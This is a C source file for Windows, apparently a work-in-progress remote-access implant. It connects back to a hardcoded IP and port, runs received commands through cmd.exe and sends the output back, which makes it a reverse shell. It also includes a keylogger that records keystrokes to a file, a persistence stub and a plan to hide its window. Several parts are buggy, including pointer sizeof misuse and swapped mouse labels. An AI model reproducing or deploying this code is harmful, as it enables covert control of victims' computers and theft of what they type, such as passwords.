#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <string.h>
#include <tchar.h>
#include <windows.h>
#include <winsock2.h>
#include <winuser.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")
#pragma comment(lib, "User32.lib")

#define BUFFER_SIZE 65536

void write_to_file(char *key, char buffer[256]) {
  if (strlen(buffer) + strlen(key) < sizeof(&buffer)) {
    snprintf(buffer + strlen(buffer), sizeof(&buffer) - strlen(buffer), "%s",
             key);
  } else {
    FILE *file;
    errno_t err = fopen_s(&file, "keys_log.txt", "a");
    fprintf(file, "%s", buffer);
    fclose(file);
    memset(&buffer, '0', strlen(buffer));
  }
}

void keylog(char keybuffer[256]) {
  if (GetAsyncKeyState(VK_LBUTTON) & 0x0001)
    write_to_file((char *)"[RIGHT_MOUSE]", keybuffer);
  if (GetAsyncKeyState(VK_RBUTTON) & 0x0001)
    write_to_file((char *)"[LEFT_MOUSE]", keybuffer);
  if (GetAsyncKeyState(VK_BACK) & 0x0001)
    write_to_file((char *)"[enable del functionality]", keybuffer);
  if (GetAsyncKeyState(VK_TAB) & 0x0001)
    write_to_file((char *)"\t", keybuffer);
  if (GetAsyncKeyState(VK_RETURN) & 0x0001)
    write_to_file((char *)"\n", keybuffer);
  if (GetAsyncKeyState(VK_SHIFT) & 0x0001)
    write_to_file((char *)"[shift functionality]", keybuffer);
  if (GetAsyncKeyState(VK_CONTROL) & 0x0001)
    write_to_file((char *)"[ctrl functionality]", keybuffer);
  if (GetAsyncKeyState(VK_MENU) & 0x0001)
    write_to_file((char *)"[menu/alt functionality]", keybuffer);
  if (GetAsyncKeyState(VK_CAPITAL) & 0x0001)
    write_to_file((char *)"[caps functionality]", keybuffer);
  if (GetAsyncKeyState(VK_SPACE) & 0x0001)
    write_to_file((char *)" ", keybuffer);
  if (GetAsyncKeyState(VK_HOME) & 0x0001)
    write_to_file((char *)"[WND]", keybuffer);
  if (GetAsyncKeyState(VK_PRINT) & 0x0001)
    write_to_file((char *)"[PRINT]", keybuffer);
  if (GetAsyncKeyState(VK_SNAPSHOT) & 0x0001)
    write_to_file((char *)"[PRINT_PAGE]", keybuffer);
  if (GetAsyncKeyState(VK_DELETE) & 0x0001)
    write_to_file((char *)"delete functionality", keybuffer);
  if (GetAsyncKeyState('0') & 0x0001)
    write_to_file((char *)"0", keybuffer);
  if (GetAsyncKeyState('1') & 0x0001)
    write_to_file((char *)"1", keybuffer);
  if (GetAsyncKeyState('2') & 0x0001)
    write_to_file((char *)"2", keybuffer);
  if (GetAsyncKeyState('3') & 0x0001)
    write_to_file((char *)"3", keybuffer);
  if (GetAsyncKeyState('4') & 0x0001)
    write_to_file((char *)"4", keybuffer);
  if (GetAsyncKeyState('5') & 0x0001)
    write_to_file((char *)"5", keybuffer);
  if (GetAsyncKeyState('6') & 0x0001)
    write_to_file((char *)"6", keybuffer);
  if (GetAsyncKeyState('7') & 0x0001)
    write_to_file((char *)"7", keybuffer);
  if (GetAsyncKeyState('8') & 0x0001)
    write_to_file((char *)"8", keybuffer);
  if (GetAsyncKeyState('9') & 0x0001)
    write_to_file((char *)"9", keybuffer);
  if (GetAsyncKeyState('A') & 0x0001)
    write_to_file((char *)"a", keybuffer);
  if (GetAsyncKeyState('B') & 0x0001)
    write_to_file((char *)"b", keybuffer);
  if (GetAsyncKeyState('C') & 0x0001)
    write_to_file((char *)"c", keybuffer);
  if (GetAsyncKeyState('D') & 0x0001)
    write_to_file((char *)"d", keybuffer);
  if (GetAsyncKeyState('E') & 0x0001)
    write_to_file((char *)"e", keybuffer);
  if (GetAsyncKeyState('F') & 0x0001)
    write_to_file((char *)"f", keybuffer);
  if (GetAsyncKeyState('G') & 0x0001)
    write_to_file((char *)"g", keybuffer);
  if (GetAsyncKeyState('H') & 0x0001)
    write_to_file((char *)"h", keybuffer);
  if (GetAsyncKeyState('I') & 0x0001)
    write_to_file((char *)"i", keybuffer);
  if (GetAsyncKeyState('J') & 0x0001)
    write_to_file((char *)"j", keybuffer);
  if (GetAsyncKeyState('K') & 0x0001)
    write_to_file((char *)"k", keybuffer);
  if (GetAsyncKeyState('L') & 0x0001)
    write_to_file((char *)"l", keybuffer);
  if (GetAsyncKeyState('M') & 0x0001)
    write_to_file((char *)"m", keybuffer);
  if (GetAsyncKeyState('N') & 0x0001)
    write_to_file((char *)"n", keybuffer);
  if (GetAsyncKeyState('O') & 0x0001)
    write_to_file((char *)"o", keybuffer);
  if (GetAsyncKeyState('P') & 0x0001)
    write_to_file((char *)"p", keybuffer);
  if (GetAsyncKeyState('Q') & 0x0001)
    write_to_file((char *)"q", keybuffer);
  if (GetAsyncKeyState('R') & 0x0001)
    write_to_file((char *)"r", keybuffer);
  if (GetAsyncKeyState('S') & 0x0001)
    write_to_file((char *)"s", keybuffer);
  if (GetAsyncKeyState('T') & 0x0001)
    write_to_file((char *)"t", keybuffer);
  if (GetAsyncKeyState('U') & 0x0001)
    write_to_file((char *)"u", keybuffer);
  if (GetAsyncKeyState('V') & 0x0001)
    write_to_file((char *)"v", keybuffer);
  if (GetAsyncKeyState('W') & 0x0001)
    write_to_file((char *)"w", keybuffer);
  if (GetAsyncKeyState('X') & 0x0001)
    write_to_file((char *)"x", keybuffer);
  if (GetAsyncKeyState('Y') & 0x0001)
    write_to_file((char *)"y", keybuffer);
  if (GetAsyncKeyState('Z') & 0x0001)
    write_to_file((char *)"Z", keybuffer);
}

// FIX: does not work exit code 998 createprocess failed
int execfunc(char command[MAX_PATH], char *cmd_output, SOCKET ConnectSocket) {
  DWORD bytes_read;
  // INFO: pipe code
  SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
  HANDLE hRead, hWrite;
  if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
    perror("CreatePipe");
    return 1;
  }

  SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

  STARTUPINFO startup_info_struct;
  PROCESS_INFORMATION process_information_struct;

  memset(&startup_info_struct, '0', sizeof(startup_info_struct));
  startup_info_struct.cb = sizeof(startup_info_struct);
  startup_info_struct.dwFlags |= STARTF_USESTDHANDLES;
  startup_info_struct.hStdOutput = hWrite;
  startup_info_struct.hStdError = hWrite;
  memset(&process_information_struct, '0', sizeof(process_information_struct));

  char command_string[MAX_PATH];
  snprintf(command_string, sizeof(command_string), "cmd.exe /c %s", command);
  if (!CreateProcess(NULL, command_string, NULL, NULL, TRUE, 0, NULL, NULL,
                     &startup_info_struct, &process_information_struct)) {
    printf("CreateProcess failed (%ld).\n", GetLastError());
    CloseHandle(hWrite);
    CloseHandle(hRead);
    return 1;
  }

  CloseHandle(hWrite);

  int iResult;
  while (
      ReadFile(hRead, cmd_output, sizeof(cmd_output) - 1, &bytes_read, NULL) &&
      bytes_read > 0) {
    cmd_output[bytes_read] = '\0';
    iResult = send(ConnectSocket, cmd_output, bytes_read + 1, 0);
    if (iResult == SOCKET_ERROR) {
      printf("send failed with error: %d\n", WSAGetLastError());
    }
  }

  CloseHandle(hRead);
  CloseHandle(process_information_struct.hProcess);
  CloseHandle(process_information_struct.hThread);
  return 0;
}

int __cdecl main() {
  // TODO: HIDE WINDOW
  // HWND hwnd = GetConsoleWindow();
  // ShowWindow(hwnd, SW_HIDE);

  char keylog_buffer[256];
  BOOL run_keylogger = FALSE;
  WSADATA wsaData;
  SOCKET ConnectSocket = INVALID_SOCKET;
  struct sockaddr_in server;

  char sendbuf[BUFFER_SIZE];
  char recvbuf[BUFFER_SIZE];
  int recvbuflen = BUFFER_SIZE;

  int iResult;

  // Initialize Winsock
  iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (iResult != 0) {
    printf("WSAStartup failed with error: %d\n", iResult);
    return 1;
  }

  memset(&server, '0', sizeof(server));
  /*server.sin_addr.s_addr = inet_addr("172.28.63.112");*/
  if (inet_pton(AF_INET, "172.28.63.112", &server.sin_addr) == -1)
    printf("problem with inet_pton");

  server.sin_family = AF_INET;
  server.sin_port = htons(1234);

  // Attempt to connect to an address until one succeeds
  while (1) {

    // Create a SOCKET for connecting to server
    ConnectSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (ConnectSocket == INVALID_SOCKET) {
      printf("socket failed with error: %d\n", WSAGetLastError());
      break;
    }

    // Connect to server.
    iResult =
        connect(ConnectSocket, (struct sockaddr *)&server, sizeof(server));
    if (iResult < 0) {
      printf("\nconnect failed, retrying in 2 seconds...\n");
      closesocket(ConnectSocket);
      ConnectSocket = INVALID_SOCKET;
      Sleep(2000);
      continue;
    }
    iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);

    if (strncmp(recvbuf, "cd ", 3) == 0) {
      char path[MAX_PATH];
      // TRY: replacing with data buf at some point
      strncpy_s(path, sizeof(path), recvbuf + 3, strlen(recvbuf) - 3);
      // INFO: sanitize the path
      int len = strlen(path);
      while (len > 0 && path[len - 1] == '\n' || path[len - 1] == '\r') {
        path[--len] = '\0';
      }
      SetCurrentDirectory(path);
      GetCurrentDirectory(MAX_PATH, (LPSTR)&sendbuf);
    } else if (strncmp(recvbuf, "q", 1) == 0) {
      strcpy_s(sendbuf, sizeof(sendbuf), "q");
      send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
      closesocket(ConnectSocket);
      memset(&recvbuf, '0', sizeof(recvbuf));
      break;
    } else if (strncmp(recvbuf, "persist", 7) == 0) {
      printf("persist hit\n");
      // INFO: enable startup on restatrt "persistence"
    }
    if (strncmp(recvbuf, "log_keys", 8) == 0 || run_keylogger)
      run_keylogger = FALSE;
    if (strncmp(recvbuf, "log_keys", 8) == 0 || run_keylogger) {
      if (!run_keylogger)
        run_keylogger = TRUE;
      keylog(keylog_buffer);
    }

    if (strncmp(recvbuf, "cwd", 3) == 0) {
      GetCurrentDirectory(MAX_PATH, (LPSTR)&sendbuf);
    } else {
      execfunc(recvbuf, sendbuf, ConnectSocket);
      printf("sendbuf contents after execfunc \n\t%s\n", sendbuf);
      goto skip_write;
    }

    if (strlen(sendbuf) > 0) {
      sendbuf[strcspn(sendbuf, "0")] = '\0';
      iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
      if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
      }
    }

  skip_write:
    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
      printf("shutdown failed with error: %d\n", WSAGetLastError());
      closesocket(ConnectSocket);
      WSACleanup();
      return 1;
    }

    memset(&recvbuf, '0', sizeof(recvbuf));
    memset(&sendbuf, '0', sizeof(sendbuf));
    closesocket(ConnectSocket);
    Sleep(1000);
  }

  WSACleanup();
  return 0;
}
